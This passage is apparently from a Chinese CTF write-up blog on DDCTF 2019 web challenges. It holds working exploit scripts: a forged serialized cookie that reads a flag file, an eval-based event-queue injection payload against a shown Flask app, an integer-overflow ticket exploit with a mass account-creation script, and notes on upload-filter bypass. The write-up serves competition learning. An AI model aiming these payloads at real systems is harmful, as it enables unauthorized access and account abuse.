<p>所以可以直接构造一个只包含flag路径的对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class Application &#123;</span><br><span class="line">    var $path = &apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$fuck = new Application();</span><br><span class="line">$fuck-&gt;path = &apos;//config/flag.txt&apos;;</span><br><span class="line"></span><br><span class="line">echo serialize($fuck);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>最终：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line">from urllib.parse import quote</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = &apos;http://117.51.158.44/app/Session.php&apos;</span><br><span class="line"></span><br><span class="line">data = &apos;O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;..././config/flag.txt&quot;;&#125;&apos;</span><br><span class="line">data =quote( data + hashlib.md5(b&apos;EzblrbNS&apos; + data.encode()).hexdigest())</span><br><span class="line"># s = requests.Session()</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=&#123;&apos;didictf_username&apos;:&apos;admin&apos;&#125;,cookies=&#123;&apos;ddctf_id&apos;:data&#125;)</span><br><span class="line">print(response.content)</span><br></pre></td></tr></table></figure></p>
<h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><blockquote>
<p>user：dd@ctf<br>pass：DD@ctf#000</p>
</blockquote>
<p>用给出的用户名和密码登录，一个文件上传页面<br>随便上传一张图，出现如下提示：</p>
<blockquote>
<p>[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()</p>
</blockquote>
<p>在图片末尾添加<code>phpinfo()</code>，上传依然出现这个错误<br>查看网页图片源码，发现了一段字符串：</p>
<blockquote>
<p>REATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 80</p>
</blockquote>
<p>搜了一下，发现了一个新名词–<strong>二次渲染</strong><br>二次渲染：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a><br>文件上传总结：<a href="https://blog.csdn.net/qq_41079177/article/details/84780056" target="_blank" rel="noopener">https://blog.csdn.net/qq_41079177/article/details/84780056</a></p>
<p>会有一次处理之后得不到flag的情况，这时可以将二次渲染的图再次下载，然后再次处理，重复几次即可</p>
<p>注：<br><a href="https://www.jianshu.com/p/f3c3f4527530" target="_blank" rel="noopener">linux/windows系统如何安装php-gd扩展库</a></p>
<h3 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h3><p>主页面：</p>
<blockquote>
<p>[INFO] you have 0 diamonds, 3 points now.<br>View source code<br>Go to e-shop<br>Reset<br>Go back to index.html</p>
</blockquote>
<p>查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">Download this .py file</span><br><span class="line">Go back to index.html</span><br><span class="line"># -*- encoding: utf-8 -*- </span><br><span class="line"># written in python 2.7 </span><br><span class="line">__author__ = &apos;garzon&apos; </span><br><span class="line"></span><br><span class="line">from flask import Flask, session, request, Response </span><br><span class="line">import urllib </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.secret_key = &apos;*********************&apos; # censored </span><br><span class="line">url_prefix = &apos;/d5af31f66741e857&apos; </span><br><span class="line"></span><br><span class="line">def FLAG(): </span><br><span class="line">    return &apos;FLAG_is_here_but_i_wont_show_you&apos;  # censored </span><br><span class="line">     </span><br><span class="line">def trigger_event(event): </span><br><span class="line">    session[&apos;log&apos;].append(event) </span><br><span class="line">    if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:] </span><br><span class="line">    if type(event) == type([]): </span><br><span class="line">        request.event_queue += event </span><br><span class="line">    else: </span><br><span class="line">        request.event_queue.append(event) </span><br><span class="line"></span><br><span class="line">def get_mid_str(haystack, prefix, postfix=None): </span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):] </span><br><span class="line">    if postfix is not None: </span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] </span><br><span class="line">    return haystack </span><br><span class="line">     </span><br><span class="line">class RollBackException: pass </span><br><span class="line"></span><br><span class="line">def execute_event_loop(): </span><br><span class="line">    valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;) </span><br><span class="line">    resp = None </span><br><span class="line">    while len(request.event_queue) &gt; 0: </span><br><span class="line">        event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot; </span><br><span class="line">        request.event_queue = request.event_queue[1:] </span><br><span class="line">        if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue </span><br><span class="line">        for c in event: </span><br><span class="line">            if c not in valid_event_chars: break </span><br><span class="line">        else: </span><br><span class="line">            is_action = event[0] == &apos;a&apos; </span><br><span class="line">            action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;) </span><br><span class="line">            args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;) </span><br><span class="line">            try: </span><br><span class="line">                event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;)) </span><br><span class="line">                ret_val = event_handler(args) </span><br><span class="line">            except RollBackException: </span><br><span class="line">                if resp is None: resp = &apos;&apos; </span><br><span class="line">                resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos; </span><br><span class="line">                resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; </span><br><span class="line">                session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;] </span><br><span class="line">                session[&apos;points&apos;] = request.prev_session[&apos;points&apos;] </span><br><span class="line">                break </span><br><span class="line">            except Exception, e: </span><br><span class="line">                if resp is None: resp = &apos;&apos; </span><br><span class="line">                #resp += str(e) # only for debugging </span><br><span class="line">                continue </span><br><span class="line">            if ret_val is not None: </span><br><span class="line">                if resp is None: resp = ret_val </span><br><span class="line">                else: resp += ret_val </span><br><span class="line">    if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404) </span><br><span class="line">    session.modified = True </span><br><span class="line">    return resp </span><br><span class="line">     </span><br><span class="line">@app.route(url_prefix+&apos;/&apos;) </span><br><span class="line">def entry_point(): </span><br><span class="line">    querystring = urllib.unquote(request.query_string) </span><br><span class="line">    request.event_queue = [] </span><br><span class="line">    if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100: </span><br><span class="line">        querystring = &apos;action:index;False#False&apos; </span><br><span class="line">    if &apos;num_items&apos; not in session: </span><br><span class="line">        session[&apos;num_items&apos;] = 0 </span><br><span class="line">        session[&apos;points&apos;] = 3 </span><br><span class="line">        session[&apos;log&apos;] = [] </span><br><span class="line">    request.prev_session = dict(session) </span><br><span class="line">    trigger_event(querystring) </span><br><span class="line">    return execute_event_loop() </span><br><span class="line"></span><br><span class="line"># handlers/functions below -------------------------------------- </span><br><span class="line"></span><br><span class="line">def view_handler(args): </span><br><span class="line">    page = args[0] </span><br><span class="line">    html = &apos;&apos; </span><br><span class="line">    html += &apos;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;]) </span><br><span class="line">    if page == &apos;index&apos;: </span><br><span class="line">        html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos; </span><br><span class="line">        html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos; </span><br><span class="line">        html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos; </span><br><span class="line">    elif page == &apos;shop&apos;: </span><br><span class="line">        html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos; </span><br><span class="line">    elif page == &apos;reset&apos;: </span><br><span class="line">        del session[&apos;num_items&apos;] </span><br><span class="line">        html += &apos;Session reset.&lt;br /&gt;&apos; </span><br><span class="line">    html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; </span><br><span class="line">    return html </span><br><span class="line"></span><br><span class="line">def index_handler(args): </span><br><span class="line">    bool_show_source = str(args[0]) </span><br><span class="line">    bool_download_source = str(args[1]) </span><br><span class="line">    if bool_show_source == &apos;True&apos;: </span><br><span class="line">     </span><br><span class="line">        source = open(&apos;eventLoop.py&apos;, &apos;r&apos;) </span><br><span class="line">        html = &apos;&apos; </span><br><span class="line">        if bool_download_source != &apos;True&apos;: </span><br><span class="line">            html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos; </span><br><span class="line">            html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos; </span><br><span class="line">             </span><br><span class="line">        for line in source: </span><br><span class="line">            if bool_download_source != &apos;True&apos;: </span><br><span class="line">                html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;) </span><br><span class="line">            else: </span><br><span class="line">                html += line </span><br><span class="line">        source.close() </span><br><span class="line">         </span><br><span class="line">        if bool_download_source == &apos;True&apos;: </span><br><span class="line">            headers = &#123;&#125; </span><br><span class="line">            headers[&apos;Content-Type&apos;] = &apos;text/plain&apos; </span><br><span class="line">            headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos; </span><br><span class="line">            return Response(html, headers=headers) </span><br><span class="line">        else: </span><br><span class="line">            return html </span><br><span class="line">    else: </span><br><span class="line">        trigger_event(&apos;action:view;index&apos;) </span><br><span class="line">         </span><br><span class="line">def buy_handler(args): </span><br><span class="line">    num_items = int(args[0]) </span><br><span class="line">    if num_items &lt;= 0: return &apos;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&apos;.format(args[0]) </span><br><span class="line">    session[&apos;num_items&apos;] += num_items  </span><br><span class="line">    trigger_event([&apos;func:consume_point;&#123;&#125;&apos;.format(num_items), &apos;action:view;index&apos;]) </span><br><span class="line">     </span><br><span class="line">def consume_point_function(args): </span><br><span class="line">    point_to_consume = int(args[0]) </span><br><span class="line">    if session[&apos;points&apos;] &lt; point_to_consume: raise RollBackException() </span><br><span class="line">    session[&apos;points&apos;] -= point_to_consume </span><br><span class="line">     </span><br><span class="line">def show_flag_function(args): </span><br><span class="line">    flag = args[0] </span><br><span class="line">    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. </span><br><span class="line">    return &apos;You naughty boy! ;) &lt;br /&gt;&apos; </span><br><span class="line">     </span><br><span class="line">def get_flag_handler(args): </span><br><span class="line">    if session[&apos;num_items&apos;] &gt;= 5: </span><br><span class="line">        trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries </span><br><span class="line">    trigger_event(&apos;action:view;index&apos;) </span><br><span class="line">     </span><br><span class="line">if __name__ == &apos;__main__&apos;: </span><br><span class="line">    app.run(debug=False, host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure></p>
<p>flag获取条件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def get_flag_handler(args):</span><br><span class="line">	if session[&apos;num_items&apos;] &gt;= 5:</span><br><span class="line">		trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries</span><br><span class="line">	trigger_event(&apos;action:view;index&apos;)</span><br></pre></td></tr></table></figure></p>
<p><code>num_items</code>是<strong>diamonds</strong>的数量，初始<strong>points</strong>3分，一分一个</p>
<p>将目标转到购买，截取发送与响应请求：<br>request：</p>
<blockquote>
<p>GET /d5af31f66741e857/?action:buy;5 HTTP/1.1<br>Host: 116.85.48.107:5002<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://116.85.48.107:5002/d5af31f66741e857/?action:view;shop" target="_blank" rel="noopener">http://116.85.48.107:5002/d5af31f66741e857/?action:view;shop</a><br>Connection: close<br>Cookie: session=eyJsb2ciOlt7IiBiIjoiWVdOMGFXOXVPblpwWlhjN2MyaHZjQT09In1dLCJudW1faXRlbXMiOjAsInBvaW50cyI6M30.D5pFbQ.Hb4GpdLm-zuQpVZkBSRlbY1B5i4<br>Upgrade-Insecure-Requests: 1</p>
</blockquote>
<p>response：</p>
<blockquote>
<p>HTTP/1.1 200 OK<br>Server: gunicorn/19.7.1<br>Date: Thu, 18 Apr 2019 17:48:50 GMT<br>Connection: close<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 113<br>Set-Cookie: session=.eJyrVsrJT1eyiq5WUkhSslKKDPczSAy3LPXP9TJMDSk2VKrVgUlF5YWVRlYVZCUZmValhBvmRBg7lSWGmxr4V4XaApWhG5AXVRAVkWwOVJEdFZEOVBEbq6OUV5obn1mSmlusZGWgo1SQn5lXAmQa1wIA440qLQ.D5pKAg.g3KyTELFqHt0j9fGhwyOR29FfmE; HttpOnly; Path=/</p>
<p>ERROR! All transactions have been cancelled. <br><a href="./?action:view;index">Go back to index.html</a><br></p>
</blockquote>
<p>将request的session进行base64解码：</p>
<blockquote>
<p>{“log”:[{“ b”:”YWN0aW9uOnZpZXc7c2hvcA==”}],”num_items”:0,”points”:6}[@vK;Vd$emA.</p>
</blockquote>
<p>大致可以确定目标，所以现在需要找到secret_key，尝试了一番，没有ssti，所以这个思路不对</p>
<ul>
<li>代码分析：</li>
<li><p>get_mid_str函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def get_mid_str(haystack, prefix, postfix=None):</span><br><span class="line">	haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">	if postfix is not None:</span><br><span class="line">		haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">	return haystack</span><br></pre></td></tr></table></figure>
</li>
<li><p>再定位到execute_event_loop()：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">while len(request.event_queue) &gt; 0:</span><br><span class="line">		event = request.event_queue[0] # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span><br><span class="line">		request.event_queue = request.event_queue[1:]</span><br><span class="line">		if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue</span><br><span class="line">		for c in event:</span><br><span class="line">			if c not in valid_event_chars: break</span><br><span class="line">		else:</span><br><span class="line">			is_action = event[0] == &apos;a&apos;</span><br><span class="line">			action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;)</span><br><span class="line">			args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>大致确定划分规则：<code>action:buy:1#;</code></p>
<ul>
<li><p>函数执行规则：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">	event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">	ret_val = event_handler(args)</span><br></pre></td></tr></table></figure>
</li>
<li><p>trigger_event:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def trigger_event(event):</span><br><span class="line">	session[&apos;log&apos;].append(event)</span><br><span class="line">	if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]</span><br><span class="line">	if type(event) == type([]):</span><br><span class="line">		request.event_queue += event</span><br><span class="line">	else:</span><br><span class="line">		request.event_queue.append(event)</span><br></pre></td></tr></table></figure>
</li>
<li><p>将event加入到session[‘log’],循环存入队列中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@app.route(url_prefix+&apos;/&apos;)</span><br><span class="line">def entry_point():</span><br><span class="line">	querystring = urllib.unquote(request.query_string)</span><br><span class="line">	request.event_queue = []</span><br><span class="line">	if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100:</span><br><span class="line">		querystring = &apos;action:index;False#False&apos;</span><br><span class="line">	if &apos;num_items&apos; not in session:</span><br><span class="line">		session[&apos;num_items&apos;] = 0</span><br><span class="line">		session[&apos;points&apos;] = 3</span><br><span class="line">		session[&apos;log&apos;] = []</span><br><span class="line">	request.prev_session = dict(session)</span><br><span class="line">	trigger_event(querystring)</span><br><span class="line">	return execute_event_loop()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>利用链则为：调用trigger_event,传入buy，得以纂改num_items，再调用get_flag_handler，获得flag<br>payload：<code>?action:trigger_event%23;action:buy;5%23action:get_flag;</code><br>最后将session进行破解可得<br>参考：<br><a href="https://www.smi1e.top/ddctf2019-%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/ddctf2019-%E4%B8%A4%E9%81%93web%E9%A2%98%E8%A7%A3/</a><br><a href="http://12end.xyz/ddctf-writeup/" target="_blank" rel="noopener">http://12end.xyz/ddctf-writeup/</a></p>
<h3 id="大吉大利，今晚吃鸡"><a href="#大吉大利，今晚吃鸡" class="headerlink" title="大吉大利，今晚吃鸡"></a>大吉大利，今晚吃鸡</h3><p>一个登录和注册页面，尝试注册登录，入场券2000，balance100，于是在订单和购买时进行各种抓包，发现在形成订单时，会有如下请求</p>
<blockquote>
<p>GET /ctf/api/buy_ticket?ticket_price=2000 HTTP/1.1<br>Host: 117.51.147.155:5050<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: application/json<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://117.51.147.155:5050/index.html" target="_blank" rel="noopener">http://117.51.147.155:5050/index.html</a><br>Connection: close<br>Cookie: user_name=shit; REVEL_SESSION=7af3ebc932b9a89f407e28a145433bb2</p>
</blockquote>
<p><strong>ticket_price</strong>可以更改，但只能改的比2000大，看了writeup，可以利用整数溢出，并且注意到一点：cookie中有<strong>revel-session</strong>字段，查了一下，所以这题是基于GoWeb，在go语言中：<br><img src="http://img.mukewang.com/5529fac20001b2f506320482.jpg" alt=""><br>各长度大小为：<br><img src="http://img.mukewang.com/552a276d0001663510160280.jpg" alt=""><br>传入<strong>4294967297</strong>，这里要注意的是，溢出发生在支付时，成功进入后，会分配一个id和ticket，然而得到flag的条件是：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419110834-6aedb18a-6250-1.png" alt=""><br>移除100个id和ticket，有个思路就是注册100个账户然后将他们删除：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#__author__=https://www.zhaoj.in/read-5269.html</span><br><span class="line"></span><br><span class="line">import threading</span><br><span class="line">from concurrent.futures.thread import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">main_session = requests.session()</span><br><span class="line"></span><br><span class="line">main_session.get(&quot;http://38.106.21.229:5000/ctf/api/login?name=glzjinmiaomiao&amp;password=miaomiao&quot;)</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def remove_bot(id, ticket):</span><br><span class="line">    global main_session</span><br><span class="line"></span><br><span class="line">    print(main_session.get(&quot;http://38.106.21.229:5000/ctf/api/get_flag&quot;).json())</span><br><span class="line"></span><br><span class="line">    print(main_session.get(&quot;http://38.106.21.229:5000/ctf/api/remove_robot?id=&quot; + str(id) + &quot;&amp;ticket=&quot; + str(ticket)).json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create_bot(index=1):</span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    s.get(&apos;http://38.106.21.229:5000/ctf/api/register?name=glzjinb4ot&apos; + str(index) + &apos;&amp;password=12345678&apos;)</span><br><span class="line"></span><br><span class="line">    r = s.get(&apos;http://38.106.21.229:5000/ctf/api/buy_ticket?ticket_price=4294967296&apos;)</span><br><span class="line"></span><br><span class="line">    r = s.get(&quot;http://38.106.21.229:5000/ctf/api/pay_ticket?bill_id=&quot; + r.json()[&apos;data&apos;][0][&apos;bill_id&apos;])</span><br><span class="line"></span><br><span class="line">    return r.json()[&apos;data&apos;][0][&apos;your_id&apos;], r.json()[&apos;data&apos;][0][&apos;your_ticket&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create_and_remove(index=1):</span><br><span class="line">    info = create_bot(index)</span><br><span class="line">    remove_bot(info[0], info[1])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=32)</span><br><span class="line"></span><br><span class="line">for i in range(1, 10000):</span><br><span class="line">    pool.submit(create_and_remove, i)</span><br><span class="line"></span><br><span class="line">pool.shutdown(True)</span><br></pre></td></tr></table></figure></p>
<h3 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h3><p><img src="https://i.imgur.com/DPT4FUl.png" alt=""><br>agent.py代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 